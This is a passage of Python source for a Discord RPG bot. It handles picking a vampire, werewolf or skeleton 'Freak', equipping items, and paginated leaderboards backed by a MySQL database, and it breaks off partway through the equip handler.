import discord
import discord.utils
from discord.ext import commands, tasks
from discord.commands import slash_command, permissions, Option

import os
import random
import mysql.connector
from dotenv import load_dotenv

load_dotenv()

embedcolor = int(os.getenv('embedcolor'), 16)
pfpurl = os.getenv('pfpurl')
footertext = os.getenv('footertext')

guildIDs = os.getenv('guildIDs')
guildIDs = guildIDs.split(',')
guildIDs = [int(x) for x in guildIDs]

whitelistroleid = int(os.getenv('whitelistroleid'))
clientuserid = int(os.getenv('clientuserid'))
token = os.getenv('bottoken')

dbhost = os.getenv('dbhost')
dbuser = os.getenv('dbuser')
dbpass = os.getenv('dbpass')
dbname = os.getenv('dbname')

vampireimgurl = os.getenv('vampireimgurl')
skeletonimgurl = os.getenv('skeletonimgurl')
werewolfimgurl = os.getenv('werewolfimgurl')

baseattacklowaccuracy = int(os.getenv('baseattacklowaccuracy'))
baseattackhighaccuracy = int(os.getenv('baseattackhighaccuracy'))

vampirebasehealth = int(os.getenv('vampirebasehealth'))
vampirebasedefense = int(os.getenv('vampirebasedefense'))
vampirebuff1name = os.getenv('vampirebuff1name')
vampirebuff2name = os.getenv('vampirebuff2name')
vampirebaseattacklow = int(os.getenv('vampirebaseattacklow'))
vampirebaseattackhigh = int(os.getenv('vampirebaseattackhigh'))
vampireattacklowname = os.getenv('vampireattacklowname')
vampireattackhighname = os.getenv('vampireattackhighname')

werewolfbasehealth = int(os.getenv('werewolfbasehealth'))
werewolfbasedefense = int(os.getenv('werewolfbasedefense'))
werewolfbuff1name = os.getenv('werewolfbuff1name')
werewolfbuff2name = os.getenv('werewolfbuff2name')
werewolfbaseattacklow = int(os.getenv('werewolfbaseattacklow'))
werewolfbaseattackhigh = int(os.getenv('werewolfbaseattackhigh'))
werewolfattacklowname = os.getenv('werewolfattacklowname')
werewolfattackhighname = os.getenv('werewolfattackhighname')

skeletonbasehealth = int(os.getenv('skeletonbasehealth'))
skeletonbasedefense = int(os.getenv('skeletonbasedefense'))
skeletonbuff1name = os.getenv('skeletonbuff1name')
skeletonbuff2name = os.getenv('skeletonbuff2name')
skeletonbaseattacklow = int(os.getenv('skeletonbaseattacklow'))
skeletonbaseattackhigh = int(os.getenv('skeletonbaseattackhigh'))
skeletonattacklowname = os.getenv('skeletonattacklowname')
skeletonattackhighname = os.getenv('skeletonattackhighname')

mydb = mysql.connector.connect(
    host=dbhost,
    user=dbuser,
    password=dbpass,
    database=dbname,
    port=3306,
    autocommit=True
)

mycursor = mydb.cursor()


class ConfirmFreak(discord.ui.View):
    def __init__(self, ctx, freakyid, freak):
        super().__init__()
        self.ctx = ctx
        self.freakyid = freakyid
        self.freak = freak
        self.msg = None

    @discord.ui.button(label='Confirm', style=discord.ButtonStyle.green)
    async def confirm(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.ctx.author.mention}. Use your own commands!**", color=embedcolor), ephemeral=True)
            return

        self.clear_items()
        self.stop()

        mycursor.execute("INSERT INTO Users (userID, gold, freak, hunted, hd, sb, o, ss, ih, pa, rn, ma, eh, vv, d ,tb) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)",
                         (self.ctx.author.id, 0, self.freakyid, False, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
        mydb.commit()

        await self.msg.edit(view=self)

        await interaction.response.send_message(embed=discord.Embed(description=f"**{self.ctx.author.mention} has successfully chosen {self.freak} as their Freak!**", color=embedcolor))

    @discord.ui.button(label='Cancel', style=discord.ButtonStyle.red)
    async def cancel(self, button: discord.ui.Button, interaction: discord.Interaction):
        if interaction.user != self.ctx.author:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.ctx.author.mention}. Use your own commands!**", color=embedcolor), ephemeral=True)
            return

        self.clear_items()
        self.stop()

        await self.msg.edit(view=self)

        await interaction.response.send_message(embed=discord.Embed(description="**Cancelled - type `/pickfreak <freak>` to retry!**", color=embedcolor))

    async def on_timeout(self):
        if self.msg:
            await self.msg.edit(embed=discord.Embed(description="**Timed out... Type `/pickfreak <freak>` to pick your own Freak again.**", color=embedcolor), view=None)


class LeaderboardDropdown(discord.ui.Select):
    def __init__(self):

        options = [
            discord.SelectOption(label='Page 1'),
            discord.SelectOption(label='Page 2'),
            discord.SelectOption(label='Page 3'),
            discord.SelectOption(label='Page 4'),
            discord.SelectOption(label='Page 5'),
            discord.SelectOption(label='Page 6'),
            discord.SelectOption(label='Page 7'),
            discord.SelectOption(label='Page 8'),
            discord.SelectOption(label='Page 9'),
            discord.SelectOption(label='Page 10'),
        ]

        super().__init__(placeholder='Please select a page...', min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        while len(self.view.enddescription) < 10:
            self.view.enddescription.append("`No users available...`")

        if self.values[0] == 'Page 1':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[0], color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 2':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[1], color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 3':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[2], color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 4':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[3], color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 5':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[4], color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 6':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[5], color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 7':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[6], color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 8':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[7], color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 9':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[8], color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 10':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", description=self.view.enddescription[9], color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()

            await interaction.response.edit_message(embed=leaderboardembed)


class LeaderboardDropdownView(discord.ui.View):
    def __init__(self, enddescription):
        super().__init__()
        self.msg = None
        self.enddescription = enddescription

        self.add_item(LeaderboardDropdown())

    async def on_timeout(self):
        if self.msg:
            await self.msg.edit(embed=discord.Embed(description="**Timed out... Type `/leaderboard` to see the leaderboard again.**", color=embedcolor), view=None)


class RoleLeaderboardDropdown(discord.ui.Select):
    def __init__(self):

        options = [
            discord.SelectOption(label='Page 1'),
            discord.SelectOption(label='Page 2'),
            discord.SelectOption(label='Page 3'),
            discord.SelectOption(label='Page 4'),
            discord.SelectOption(label='Page 5'),
            discord.SelectOption(label='Page 6'),
            discord.SelectOption(label='Page 7'),
            discord.SelectOption(label='Page 8'),
            discord.SelectOption(label='Page 9'),
            discord.SelectOption(label='Page 10'),
        ]

        super().__init__(placeholder='Please select a page...', min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        while len(self.view.whitelistfields) < 10:
            self.view.whitelistfields.append("`No users available...`")

        while len(self.view.peasantfields) < 10:
            self.view.peasantfields.append("`No users available...`")

        if self.values[0] == 'Page 1':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()
            leaderboardembed.add_field(
                name="Whitelist", value=self.view.whitelistfields[0], inline=False)
            leaderboardembed.add_field(
                name="Peasants ", value=self.view.peasantfields[0], inline=False)

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 2':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()
            leaderboardembed.add_field(
                name="Whitelist", value=self.view.whitelistfields[1], inline=False)
            leaderboardembed.add_field(
                name="Peasants ", value=self.view.peasantfields[1], inline=False)

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 3':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()
            leaderboardembed.add_field(
                name="Whitelist", value=self.view.whitelistfields[2], inline=False)
            leaderboardembed.add_field(
                name="Peasants ", value=self.view.peasantfields[2], inline=False)

        elif self.values[0] == 'Page 4':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()
            leaderboardembed.add_field(
                name="Whitelist", value=self.view.whitelistfields[3], inline=False)
            leaderboardembed.add_field(
                name="Peasants ", value=self.view.peasantfields[3], inline=False)

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 5':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()
            leaderboardembed.add_field(
                name="Whitelist", value=self.view.whitelistfields[4], inline=False)
            leaderboardembed.add_field(
                name="Peasants ", value=self.view.peasantfields[4], inline=False)

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 6':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()
            leaderboardembed.add_field(
                name="Whitelist", value=self.view.whitelistfields[5], inline=False)
            leaderboardembed.add_field(
                name="Peasants ", value=self.view.peasantfields[5], inline=False)

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 7':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()
            leaderboardembed.add_field(
                name="Whitelist", value=self.view.whitelistfields[6], inline=False)
            leaderboardembed.add_field(
                name="Peasants ", value=self.view.peasantfields[6], inline=False)

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 8':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()
            leaderboardembed.add_field(
                name="Whitelist", value=self.view.whitelistfields[7], inline=False)
            leaderboardembed.add_field(
                name="Peasants ", value=self.view.peasantfields[7], inline=False)

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 9':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()
            leaderboardembed.add_field(
                name="Whitelist", value=self.view.whitelistfields[8], inline=False)
            leaderboardembed.add_field(
                name="Peasants ", value=self.view.peasantfields[8], inline=False)

            await interaction.response.edit_message(embed=leaderboardembed)

        elif self.values[0] == 'Page 10':
            leaderboardembed = discord.Embed(
                title=f"Leaderboard - {self.values[0]}", color=embedcolor)
            leaderboardembed.set_thumbnail(url=pfpurl)
            leaderboardembed.set_footer(text=footertext, icon_url=pfpurl)
            leaderboardembed.timestamp = discord.utils.utcnow()
            leaderboardembed.add_field(
                name="Whitelist", value=self.view.whitelistfields[9], inline=False)
            leaderboardembed.add_field(
                name="Peasants ", value=self.view.peasantfields[9], inline=False)

            await interaction.response.edit_message(embed=leaderboardembed)


class RoleLeaderboardDropdownView(discord.ui.View):
    def __init__(self, whitelistfields, peasantfields):
        super().__init__()
        self.msg = None
        self.whitelistfields = whitelistfields
        self.peasantfields = peasantfields

        self.add_item(RoleLeaderboardDropdown())

    async def on_timeout(self):
        if self.msg:
            await self.msg.edit(embed=discord.Embed(description="**Timed out... Type `/roleleaderboard` to see the role leaderboard again.**", color=embedcolor), view=None)


class EquipDropdown(discord.ui.Select):
    def __init__(self):

        options = [
            discord.SelectOption(label='Hidden Dagger',
                                 description="+10 Attack Damage for High Attack"),
            discord.SelectOption(label='Standard Blade',
                                 description="+5 Attack Damage for Low Attack"),
            discord.SelectOption(label='Ooze',
                                 description="+10 Attack Damage for All Attacks"),
            discord.SelectOption(label='Standard Shield',
                                 description="+10 Defense against High Attack"),
            discord.SelectOption(label='Iron Helmet',
                                 description="+5 Defense against Low Attack"),
            discord.SelectOption(label='Platinum Armour',
                                 description="+10 Defense"),
            discord.SelectOption(label='Rune Necklace',
                                 description="+10% Accuracy for Low Attack"),
            discord.SelectOption(label='Mystic Artifact',
                                 description="+10% Accuracy for High Attack"),
            discord.SelectOption(label='Enchanted Headpiece',
                                 description="+10% Accuracy for All Attacks"),
            discord.SelectOption(label='Vital Vial',
                                 description="+20 Health"),
            discord.SelectOption(label='Deathspike',
                                 description="+15% Pierce Chance for All Attacks"),
            discord.SelectOption(label='Tea Bag',
                                 description="+10% Chance to Equipment Steal and +5% Value to Gold Steal")
        ]

        super().__init__(placeholder='Please select an item to equip...',
                         min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        if interaction.user != self.view.ctx.author:
            await interaction.response.send_message(embed=discord.Embed(description=f"**You are not {self.view.ctx.author.mention}. Use your own commands!**", color=embedcolor), ephemeral=True)
            return

        if self.values[0] == 'Hidden Dagger':
            # checks whether player has hd
            mycursor.execute("SELECT hd FROM Users WHERE userID=%(userID)s",
                             {'userID': interaction.user.id})
            for hd in mycursor:
                if hd[0] < 1:
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for x in mycursor:
                        equipments = []
                        for equipment in x:
                            if equipment == "HD":
                                equipments.append("Hidden Dagger")
                            elif equipment == "SB":
                                equipments.append("Standard Blade")
                            elif equipment == "O":
                                equipments.append("Ooze")
                            elif equipment == "SS":
                                equipments.append("Standard Shield")
                            elif equipment == "IH":
                                equipments.append("Iron Helmet")
                            elif equipment == "PA":
                                equipments.append("Platinum Armour")
                            elif equipment == "RN":
                                equipments.append("Rune Necklace")
                            elif equipment == "MA":
                                equipments.append("Mystic Artifact")
                            elif equipment == "EH":
                                equipments.append("Enchanted Headpiece")
                            elif equipment == "VV":
                                equipments.append("Vital Vial")
                            elif equipment == "D":
                                equipments.append("Deathspike")
                            elif equipment == "TB":
                                equipments.append("Tea Bag")

                        while len(equipments) < 3:
                            equipments.append("None equipped")

                    embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                          description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You do not have a Hidden Dagger...**", color=embedcolor)
                    embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
                    embed.set_author(name=interaction.user.name,
                                     icon_url=interaction.user.avatar.url)
                    embed.timestamp = discord.utils.utcnow()

                    view = Equip(self.view.ctx)
                    await interaction.response.edit_message(embed=embed, view=view)
                    view.msg = await interaction.original_message()
                    return
                else:
                    # if they have hd then check if they already wearing one
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for e in mycursor:
                        if "HD" in e:
                            mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                             {'userID': interaction.user.id})

                            for x in mycursor:
                                equipments = []
                                for equipment in x:
                                    if equipment == "HD":
                                        equipments.append("Hidden Dagger")
                                    elif equipment == "SB":
                                        equipments.append("Standard Blade")
                                    elif equipment == "O":
                                        equipments.append("Ooze")
                                    elif equipment == "SS":
                                        equipments.append("Standard Shield")
                                    elif equipment == "IH":
                                        equipments.append("Iron Helmet")
                                    elif equipment == "PA":
                                        equipments.append("Platinum Armour")
                                    elif equipment == "RN":
                                        equipments.append("Rune Necklace")
                                    elif equipment == "MA":
                                        equipments.append("Mystic Artifact")
                                    elif equipment == "EH":
                                        equipments.append("Enchanted Headpiece")
                                    elif equipment == "VV":
                                        equipments.append("Vital Vial")
                                    elif equipment == "D":
                                        equipments.append("Deathspike")
                                    elif equipment == "TB":
                                        equipments.append("Tea Bag")

                                while len(equipments) < 3:
                                    equipments.append("None equipped")

                            embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You already have a Hidden Dagger equipped...**", color=embedcolor)
                            embed.set_footer(
                                text=footertext, icon_url=interaction.user.guild.icon.url)
                            embed.set_author(name=interaction.user.name,
                                             icon_url=interaction.user.avatar.url)
                            embed.timestamp = discord.utils.utcnow()

                            view = Equip(self.view.ctx)
                            await interaction.response.edit_message(embed=embed, view=view)
                            view.msg = await interaction.original_message()
                            return

                        else:  # if not equip it
                            mycursor.execute("UPDATE Users SET {} = 'HD' WHERE userID=%(userID)s".format(
                                self.view.equipment), {'userID': interaction.user.id})
                            mydb.commit()

        elif self.values[0] == 'Standard Blade':
            # checks whether player has hd
            mycursor.execute("SELECT sb FROM Users WHERE userID=%(userID)s",
                             {'userID': interaction.user.id})
            for hd in mycursor:
                if hd[0] < 1:
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for x in mycursor:
                        equipments = []
                        for equipment in x:
                            if equipment == "HD":
                                equipments.append("Hidden Dagger")
                            elif equipment == "SB":
                                equipments.append("Standard Blade")
                            elif equipment == "O":
                                equipments.append("Ooze")
                            elif equipment == "SS":
                                equipments.append("Standard Shield")
                            elif equipment == "IH":
                                equipments.append("Iron Helmet")
                            elif equipment == "PA":
                                equipments.append("Platinum Armour")
                            elif equipment == "RN":
                                equipments.append("Rune Necklace")
                            elif equipment == "MA":
                                equipments.append("Mystic Artifact")
                            elif equipment == "EH":
                                equipments.append("Enchanted Headpiece")
                            elif equipment == "VV":
                                equipments.append("Vital Vial")
                            elif equipment == "D":
                                equipments.append("Deathspike")
                            elif equipment == "TB":
                                equipments.append("Tea Bag")

                        while len(equipments) < 3:
                            equipments.append("None equipped")

                    embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                          description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You do not have a Standard Blade...**", color=embedcolor)
                    embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
                    embed.set_author(name=interaction.user.name,
                                     icon_url=interaction.user.avatar.url)
                    embed.timestamp = discord.utils.utcnow()

                    view = Equip(self.view.ctx)
                    await interaction.response.edit_message(embed=embed, view=view)
                    view.msg = await interaction.original_message()
                    return
                else:
                    # if they have hd then check if they already wearing one
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for e in mycursor:
                        if "SB" in e:
                            mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                             {'userID': interaction.user.id})

                            for x in mycursor:
                                equipments = []
                                for equipment in x:
                                    if equipment == "HD":
                                        equipments.append("Hidden Dagger")
                                    elif equipment == "SB":
                                        equipments.append("Standard Blade")
                                    elif equipment == "O":
                                        equipments.append("Ooze")
                                    elif equipment == "SS":
                                        equipments.append("Standard Shield")
                                    elif equipment == "IH":
                                        equipments.append("Iron Helmet")
                                    elif equipment == "PA":
                                        equipments.append("Platinum Armour")
                                    elif equipment == "RN":
                                        equipments.append("Rune Necklace")
                                    elif equipment == "MA":
                                        equipments.append("Mystic Artifact")
                                    elif equipment == "EH":
                                        equipments.append("Enchanted Headpiece")
                                    elif equipment == "VV":
                                        equipments.append("Vital Vial")
                                    elif equipment == "D":
                                        equipments.append("Deathspike")
                                    elif equipment == "TB":
                                        equipments.append("Tea Bag")

                                while len(equipments) < 3:
                                    equipments.append("None equipped")

                            embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You already have a Standard Blade equipped...**", color=embedcolor)
                            embed.set_footer(
                                text=footertext, icon_url=interaction.user.guild.icon.url)
                            embed.set_author(name=interaction.user.name,
                                             icon_url=interaction.user.avatar.url)
                            embed.timestamp = discord.utils.utcnow()

                            view = Equip(self.view.ctx)
                            await interaction.response.edit_message(embed=embed, view=view)
                            view.msg = await interaction.original_message()
                            return

                        else:  # if not equip it
                            mycursor.execute("UPDATE Users SET {} = 'SB' WHERE userID=%(userID)s".format(
                                self.view.equipment), {'userID': interaction.user.id})
                            mydb.commit()

        elif self.values[0] == 'Ooze':
            # checks whether player has hd
            mycursor.execute("SELECT o FROM Users WHERE userID=%(userID)s",
                             {'userID': interaction.user.id})
            for hd in mycursor:
                if hd[0] < 1:
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for x in mycursor:
                        equipments = []
                        for equipment in x:
                            if equipment == "HD":
                                equipments.append("Hidden Dagger")
                            elif equipment == "SB":
                                equipments.append("Standard Blade")
                            elif equipment == "O":
                                equipments.append("Ooze")
                            elif equipment == "SS":
                                equipments.append("Standard Shield")
                            elif equipment == "IH":
                                equipments.append("Iron Helmet")
                            elif equipment == "PA":
                                equipments.append("Platinum Armour")
                            elif equipment == "RN":
                                equipments.append("Rune Necklace")
                            elif equipment == "MA":
                                equipments.append("Mystic Artifact")
                            elif equipment == "EH":
                                equipments.append("Enchanted Headpiece")
                            elif equipment == "VV":
                                equipments.append("Vital Vial")
                            elif equipment == "D":
                                equipments.append("Deathspike")
                            elif equipment == "TB":
                                equipments.append("Tea Bag")

                        while len(equipments) < 3:
                            equipments.append("None equipped")

                    embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                          description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You do not have an Ooze...**", color=embedcolor)
                    embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
                    embed.set_author(name=interaction.user.name,
                                     icon_url=interaction.user.avatar.url)
                    embed.timestamp = discord.utils.utcnow()

                    view = Equip(self.view.ctx)
                    await interaction.response.edit_message(embed=embed, view=view)
                    view.msg = await interaction.original_message()
                    return
                else:
                    # if they have hd then check if they already wearing one
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for e in mycursor:
                        if "O" in e:
                            mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                             {'userID': interaction.user.id})

                            for x in mycursor:
                                equipments = []
                                for equipment in x:
                                    if equipment == "HD":
                                        equipments.append("Hidden Dagger")
                                    elif equipment == "SB":
                                        equipments.append("Standard Blade")
                                    elif equipment == "O":
                                        equipments.append("Ooze")
                                    elif equipment == "SS":
                                        equipments.append("Standard Shield")
                                    elif equipment == "IH":
                                        equipments.append("Iron Helmet")
                                    elif equipment == "PA":
                                        equipments.append("Platinum Armour")
                                    elif equipment == "RN":
                                        equipments.append("Rune Necklace")
                                    elif equipment == "MA":
                                        equipments.append("Mystic Artifact")
                                    elif equipment == "EH":
                                        equipments.append("Enchanted Headpiece")
                                    elif equipment == "VV":
                                        equipments.append("Vital Vial")
                                    elif equipment == "D":
                                        equipments.append("Deathspike")
                                    elif equipment == "TB":
                                        equipments.append("Tea Bag")

                                while len(equipments) < 3:
                                    equipments.append("None equipped")

                            embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                                  description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You already have an Ooze equipped...**", color=embedcolor)
                            embed.set_footer(
                                text=footertext, icon_url=interaction.user.guild.icon.url)
                            embed.set_author(name=interaction.user.name,
                                             icon_url=interaction.user.avatar.url)
                            embed.timestamp = discord.utils.utcnow()

                            view = Equip(self.view.ctx)
                            await interaction.response.edit_message(embed=embed, view=view)
                            view.msg = await interaction.original_message()
                            return

                        else:  # if not equip it
                            mycursor.execute("UPDATE Users SET {} = 'O' WHERE userID=%(userID)s".format(
                                self.view.equipment), {'userID': interaction.user.id})
                            mydb.commit()

        elif self.values[0] == 'Standard Shield':
            # checks whether player has hd
            mycursor.execute("SELECT ss FROM Users WHERE userID=%(userID)s",
                             {'userID': interaction.user.id})
            for hd in mycursor:
                if hd[0] < 1:
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for x in mycursor:
                        equipments = []
                        for equipment in x:
                            if equipment == "HD":
                                equipments.append("Hidden Dagger")
                            elif equipment == "SB":
                                equipments.append("Standard Blade")
                            elif equipment == "O":
                                equipments.append("Ooze")
                            elif equipment == "SS":
                                equipments.append("Standard Shield")
                            elif equipment == "IH":
                                equipments.append("Iron Helmet")
                            elif equipment == "PA":
                                equipments.append("Platinum Armour")
                            elif equipment == "RN":
                                equipments.append("Rune Necklace")
                            elif equipment == "MA":
                                equipments.append("Mystic Artifact")
                            elif equipment == "EH":
                                equipments.append("Enchanted Headpiece")
                            elif equipment == "VV":
                                equipments.append("Vital Vial")
                            elif equipment == "D":
                                equipments.append("Deathspike")
                            elif equipment == "TB":
                                equipments.append("Tea Bag")

                        while len(equipments) < 3:
                            equipments.append("None equipped")

                    embed = discord.Embed(title=f"{interaction.user.display_name}'s Equipment",
                                          description=f"Equipment 1 - `{equipments[0]}`\nEquipment 2 - `{equipments[1]}`\nEquipment 3 - `{equipments[2]}`\n\n**You do not have a Standard Shield...**", color=embedcolor)
                    embed.set_footer(text=footertext, icon_url=interaction.user.guild.icon.url)
                    embed.set_author(name=interaction.user.name,
                                     icon_url=interaction.user.avatar.url)
                    embed.timestamp = discord.utils.utcnow()

                    view = Equip(self.view.ctx)
                    await interaction.response.edit_message(embed=embed, view=view)
                    view.msg = await interaction.original_message()
                    return
                else:
                    # if they have hd then check if they already wearing one
                    mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                     {'userID': interaction.user.id})

                    for e in mycursor:
                        if "SS" in e:
                            mycursor.execute("SELECT equipment1, equipment2, equipment3 FROM Users WHERE userID=%(userID)s",
                                             {'userID': interaction.user.id})

                            for x in mycursor:
                                equipments = []
